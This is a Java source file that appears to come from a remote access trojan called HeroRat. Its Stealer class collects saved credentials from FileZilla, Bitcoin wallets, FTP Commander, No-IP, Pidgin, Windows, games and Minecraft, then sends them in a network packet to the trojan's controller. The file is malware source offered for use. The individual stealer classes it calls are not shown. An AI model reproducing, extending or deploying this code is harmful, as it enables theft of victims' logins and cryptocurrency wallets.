package net.herorat.features.stealer;

import java.io.DataOutputStream;

import net.herorat.network.Packet;
import net.herorat.network.Packet11Stealer;


public class Stealer
{
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		Packet p = new Packet11Stealer(outputstream, new String[] { getLogin() });
		p.write();
	}

	public static String getLogin()
	{
		StringBuffer buffer = new StringBuffer();
		
		buffer.append( StealerFileZilla.getLogin() );
		buffer.append( StealerBitcoin.getLogin() );
		buffer.append( StealerFTPCommander.getLogin() );
		buffer.append( StealerNoIp.getLogin() );
		buffer.append( StealerPidgin.getLogin() );
		buffer.append( StealerWindows.getLogin() );
		buffer.append( StealerGames.getLogin() );
		buffer.append( StealerMinecraft.getLogin() );

		return buffer.toString();
	}
}